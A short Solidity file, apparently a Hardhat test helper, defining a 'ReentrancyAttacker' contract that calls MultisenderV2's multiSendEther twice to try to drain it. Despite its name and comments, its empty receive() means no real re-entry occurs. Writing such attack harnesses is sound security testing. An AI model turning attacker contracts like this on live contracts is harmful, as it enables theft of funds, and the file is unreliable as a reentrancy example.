// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./MultisenderV2.sol";
import "hardhat/console.sol";

contract ReentrancyAttacker {
    MultisenderV2 private multiSenderV2;
    address payable[] private addresses;
    uint256[] private amounts;

    /** @dev This constructor is used to initialize an instance of MultisenderV2 Contract */
    constructor(
        address _multiSenderV2Address,
        address payable[] memory _addresses,
        uint256[] memory _amounts
    ) payable {
        multiSenderV2 = MultisenderV2(_multiSenderV2Address);
        addresses = _addresses;
        amounts = _amounts;
    }

    /** @dev This function is used to attack the MultisenderV2 Contract while contract's state is still being updated
    To sendEther to the list of addresses before remainingBalance of the contract is deducted from the transactions
    */
    function attack() external payable {
        console.log("Attacking...");
        multiSenderV2.multiSendEther(addresses, amounts);
        multiSenderV2.multiSendEther(addresses, amounts);
        console.log("Done");
    }

    /** @dev To gracefully handle receiving of ether from senders who did not explicitly state the function call */
    receive() external payable {
        // Do nothing
    }
}
